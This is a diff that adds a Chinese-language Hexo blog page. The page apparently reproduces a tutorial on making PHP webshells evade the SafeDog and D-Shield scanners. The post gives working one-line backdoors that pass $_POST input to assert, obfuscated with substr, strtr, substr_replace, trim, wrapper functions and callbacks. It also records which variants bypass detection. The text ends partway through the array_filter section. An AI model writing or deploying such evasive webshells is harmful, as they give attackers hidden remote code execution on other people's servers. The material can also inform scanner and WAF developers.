@@ -1,0 +1,927 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>helloworld | Step by Step</title><meta name="author" content="Grid"><meta name="copyright" content="Grid"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP 有很多经典的免杀姿势可以总结学习，不知道以前国光我在干啥，这个实际上早就该掌握的知识了，果然是 “逆水行舟，不进则退” 啊 。 环境准备   防护软件 官网 版本日期    网站安全狗 网站安全狗 2020-04-02 Apache Apache 版 V4.0.28330   D 盾 D 盾_防火墙 2019-10-31 V2.1.5.4   安全狗安装比较坑，国光使用 PHPStudty">
+<meta property="og:type" content="article">
+<meta property="og:title" content="helloworld">
+<meta property="og:url" content="https://gridhub.github.io/2023/06/05/helloworld/index.html">
+<meta property="og:site_name" content="Step by Step">
+<meta property="og:description" content="PHP 有很多经典的免杀姿势可以总结学习，不知道以前国光我在干啥，这个实际上早就该掌握的知识了，果然是 “逆水行舟，不进则退” 啊 。 环境准备   防护软件 官网 版本日期    网站安全狗 网站安全狗 2020-04-02 Apache Apache 版 V4.0.28330   D 盾 D 盾_防火墙 2019-10-31 V2.1.5.4   安全狗安装比较坑，国光使用 PHPStudty">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gridhub.github.io/img/wechat.jpg">
+<meta property="article:published_time" content="2023-06-05T08:42:34.000Z">
+<meta property="article:modified_time" content="2023-06-05T08:49:03.404Z">
+<meta property="article:author" content="Grid">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gridhub.github.io/img/wechat.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://gridhub.github.io/2023/06/05/helloworld/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'helloworld',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-05 16:49:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/wechat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/beijing_top.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Step by Step"><span class="site-name">Step by Step</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">helloworld</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-05T08:42:34.000Z" title="发表于 2023-06-05 16:42:34">2023-06-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T08:49:03.404Z" title="更新于 2023-06-05 16:49:03">2023-06-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="helloworld"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>PHP 有很多经典的免杀姿势可以总结学习，不知道以前国光我在干啥，这个实际上早就该掌握的知识了，果然是 “逆水行舟，不进则退” 啊 。</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><table>
+<thead>
+<tr>
+<th>防护软件</th>
+<th>官网</th>
+<th>版本日期</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>网站安全狗</td>
+<td><a target="_blank" rel="noopener" href="http://free.safedog.cn/website_safedog.html">网站安全狗</a></td>
+<td>2020-04-02 Apache Apache 版 V4.0.28330</td>
+</tr>
+<tr>
+<td>D 盾</td>
+<td><a target="_blank" rel="noopener" href="http://www.d99net.net/">D 盾_防火墙</a></td>
+<td>2019-10-31 V2.1.5.4</td>
+</tr>
+</tbody></table>
+<p>安全狗安装比较坑，国光使用 PHPStudty 2018 版本安装的时候，默认是检测不到 服务名的，然后提示：<strong>服务名不允许为空</strong></p>
+<p>所以安装前得首先安装一下 Apache 服务，首先停止 PHPStudy 的 Apache 和 MySQL 服务，然后以管理员身份运行 CMD ，接着到 Apache 的 bin 目录下执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">httpd.exe -k install -n Apache</span><br><span class="line"></span><br><span class="line"># 安装成功的输出信息</span><br><span class="line">C:\phpStudy\PHPTutorial\Apache\bin&gt;httpd.exe -k install -n Apache</span><br><span class="line">Installing the &#x27;Apache&#x27; service</span><br><span class="line">The &#x27;Apache&#x27; service is successfully installed.</span><br><span class="line">Testing httpd.conf....</span><br><span class="line">Errors reported here must be corrected before the service can be started.</span><br></pre></td></tr></table></figure>
+
+<p>如果要卸载服务的话，输入如下命令 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JAVASCRIPT</span><br><span class="line">sc delete Apache</span><br></pre></td></tr></table></figure>
+
+<p>接着先不要着急启动 PHPStudy 服务，手动到 Windows 服务中启动 Apache ，最终效果图如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200711/15944303896376.png"><img src="https://image.3001.net/images/20200711/15944303896376.png" alt="img"></a></p>
+<p>然后就可以愉快地安装安全狗了，大概需要 1 分钟时间。 安装好安全狗之后，记得取消加入 “云计划” 这个选项：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200708/15942160612332.png"><img src="https://image.3001.net/images/20200708/15942160612332.png" alt="img"></a></p>
+<h1 id="eval-与-assert"><a href="#eval-与-assert" class="headerlink" title="eval 与 assert"></a>eval 与 assert</h1><p>eval () 不能作为函数名动态执行代码，官方说明如下：eval 是一个语言构造器而不是一个函数，不能被可变函数调用。</p>
+<p><strong>可变函数</strong>：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号 ()，让系统认为该值是一个函数，从而当做函数来执行。比如 assert 可这样用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">$f=&#x27;assert&#x27;;</span><br><span class="line">$f(...);</span><br></pre></td></tr></table></figure>
+
+<p>此时 <code>$f</code> 就表示 <code>assert</code>，所以 <code>assert</code> 关键词更加灵活，但是 PHP7 中，<code>assert</code> 也不再是函数了，变成了一个语言结构（类似 <code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点，不过这个暂时不在本文范围内，国光目前先把 PHP5 下的免杀总计好，后面再来慢慢总结 PHP7 下的免杀。</p>
+<h1 id="字符串变形"><a href="#字符串变形" class="headerlink" title="字符串变形"></a>字符串变形</h1><p>安全狗的规则非常死板，字符串相关函数简单变形一下关键词就可以绕过安全狗的检测了，D 盾的话要严格一点。PHP 内置了一些字符串函数，以下函数国光测试均可以 Bypass 安全狗。</p>
+<h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>
+
+<p>substr () 函数返回字符串的一部分。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要返回其中一部分的字符串。</td>
+</tr>
+<tr>
+<td><em>start</em></td>
+<td>必需。规定在字符串的何处开始。<strong>正数</strong> - 在字符串的指定位置开始；<strong>负数</strong> - 在从字符串结尾开始的指定位置开始； <strong>0</strong> - 在字符串中的第一个字符处开始</td>
+</tr>
+<tr>
+<td><em>length</em></td>
+<td>可选。规定被返回字符串的长度。默认是直到字符串的结尾。<strong>正数</strong> - 从 <em>start</em> 参数所在的位置返回的长度； <strong>负数</strong> - 从字符串末端返回的长度</td>
+</tr>
+</tbody></table>
+<p>首先我们来一个基础的字符串拼接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = &#x27;a&#x27;.&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;;</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也许在很久以前这个是可以过 安全狗的，但是直接扑街了，检测结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 assert 变量函数</td>
+<td>级别 5 变量函数后门</td>
+</tr>
+</tbody></table>
+<p>此时我们使用 substr () 函数稍微截断一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = substr(&#x27;1a&#x27;,1).&#x27;s&#x27;.&#x27;s&#x27;.&#x27;e&#x27;.&#x27;r&#x27;.&#x27;t&#x27;;</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时就已经过掉安全狗了，D 盾检测级别降到了 4 级，检测结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 4 变量函数后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200708/15942208146607.png"><img src="https://image.3001.net/images/20200708/15942208146607.png" alt="img"></a></p>
+<p>当然我们此时也是可以正常执行命令的：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200708/15942211373081.png"><img src="/images/15942211373081.png" alt="img"></a></p>
+<p>此时是可以执行简单的命令的。因为临时用的 PHPStudy 环境，所以 D 盾没有完全发挥监控的作用，因为 D 盾得在 IIS 环境下测试才可以完全发挥功能，目前我们只临时用 D 盾做 Webshell 查杀的功能。</p>
+<p>另外虽然此时这个 Webshell 已经免杀了，且也可以执行任意命令，但是如果我使用中国菜刀或者中国蚁剑之类的一句话客户端工具去连接的话，依然还是会被拦截的，这个涉及到蚁剑的自定义编码和解码器了，这个会在下文中单独介绍，目前这部分内容我们只研究基本的 Webshell 免杀。</p>
+<h2 id="strtr"><a href="#strtr" class="headerlink" title="strtr()"></a>strtr()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">strtr(string,from,to)</span><br></pre></td></tr></table></figure>
+
+<p>strtr () 函数转换字符串中特定的字符。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要转换的字符串。</td>
+</tr>
+<tr>
+<td><em>from</em></td>
+<td>必需（除非使用数组）。规定要改变的字符。</td>
+</tr>
+<tr>
+<td><em>to</em></td>
+<td>必需（除非使用数组）。规定要改变为的字符。</td>
+</tr>
+<tr>
+<td><em>array</em></td>
+<td>必需（除非使用 <em>from</em> 和 <em>to</em>）。数组，其中的键名是更改的原始字符，键值是更改的目标字符。</td>
+</tr>
+</tbody></table>
+<p>依然对字符串进行简单地处理一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = strtr(&#x27;azxcvt&#x27;,&#x27;zxcv&#x27;,&#x27;sser&#x27;);</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时就已经过掉安全狗了，D 盾检测级别降到了 1 级，检测结果如下：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 1 可疑变量函数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942525903192.png"><img src="https://image.3001.net/images/20200709/15942525903192.png" alt="img"></a></p>
+<h2 id="substr-replace"><a href="#substr-replace" class="headerlink" title="substr_replace()"></a>substr_replace()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">substr_replace(string,replacement,start,length)</span><br></pre></td></tr></table></figure>
+
+<p>substr_replace () 函数把字符串 string 的一部分替换为另一个字符串 replacement。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td><em>replacement</em></td>
+<td>必需。规定要插入的字符串。</td>
+</tr>
+<tr>
+<td><em>start</em></td>
+<td>必需。规定在字符串的何处开始替换。<strong>正数</strong> - 在字符串中的指定位置开始替换；<strong>负数</strong> - 在从字符串结尾的指定位置开始替换； <strong>0</strong> - 在字符串中的第一个字符处开始替换</td>
+</tr>
+<tr>
+<td><em>length</em></td>
+<td>可选。规定要替换多少个字符。默认是与字符串长度相同。<strong>正数</strong> - 被替换的字符串长度；<strong>负数</strong> - 表示待替换的子字符串结尾处距离 <em>string</em> 末端的字符个数。<strong>0</strong> - 插入而非替换</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = substr_replace(&quot;asxxx&quot;,&quot;sert&quot;,2);</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 1 (可疑) 变量函数</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200708/15942200261156.png"><img src="https://image.3001.net/images/20200708/15942200261156.png" alt="img"></a></p>
+<h2 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>
+
+<p>trim () 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要检查的字符串。</td>
+</tr>
+<tr>
+<td><em>charlist</em></td>
+<td>可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符 <code>\0</code> - NULL; <code>\t</code> - 制表符；<code>\n</code> - 换行；<code>\x0B</code> - 垂直制表符；<code>\r</code> - 回车；<strong>空格</strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    $a = trim(&#x27; assert &#x27;);</span><br><span class="line">    $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0 个安全风险</td>
+<td>级别 4 变量函数后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942536126576.png"><img src="/images/15942536126576.png" alt="img"></a></p>
+<h1 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h1><p>函数可以把敏感关键词当做参数传递，不过最近版本的安全狗似乎完善了这种检测规则，测试的几个都没有过狗，但是 D 盾的级别降到了 2 级：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    function sqlsec($a)&#123;</span><br><span class="line">        $a($_POST[&#x27;x&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sqlsec(assert);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 assert 变量函数</td>
+<td>级别 2 变量函数后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942556048199.png"><img src="https://image.3001.net/images/20200709/15942556048199.png" alt="img"></a></p>
+<p>但是换一种方式将 <code>$_POST[&#39;x&#39;]</code> 当做参数传递的话就都翻车了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">    function sqlsec($a)&#123;</span><br><span class="line">        assert($a);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlsec($_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 assert PHP 一句话后门</td>
+<td>已知后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942563345904.png"><img src="/images/15942563345904.png" alt="img"></a></p>
+<h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><p>前辈们说常⽤的回调函数⼤部分都无法绕过 WAF 了，测试了 P 神博客分享的一些回调函数，发现均被拦截识别出来了。下面还是来手工一个个验证看看吧。</p>
+<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    call_user_func(&#x27;assert&#x27;,$_POST[&#x27;x&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种传统的回调后门，看了 P 神的博客，15 年的时候就已经被一些安全厂商盯上了……</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 call_user_func 后门</td>
+<td>级别 5 (内藏) call_user_func 后门</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942595021438.png"><img src="/images/15942595021438.png" alt="img"></a></p>
+<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">call_user_func_array ( callable $callback , array $param_arr )</span><br></pre></td></tr></table></figure>
+
+<p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">    call_user_func_array(assert,array($_POST[&#x27;x&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不过安全狗和 D 盾都对这个函数进行检测了：</p>
+<table>
+<thead>
+<tr>
+<th>安全狗</th>
+<th>D 盾</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 个安全风险 call_user_func_array 回调后门</td>
+<td>级别 4 call_user_func_array</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200709/15942588857035.png"><img src="https://image.3001.net/images/20200709/15942588857035.png" alt="img"></a></p>
+<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</span><br></pre></td></tr></table></figure>
+
+<p>依次将 <code>array</code> 数组中的每个值传递到 <code>callback</code> 函数。如果 <code>callback</code> 函数返回 true，则 <code>array</code> 数组的当前值会被包含在返回的结果数组中，数组的键名保留不变。</p>
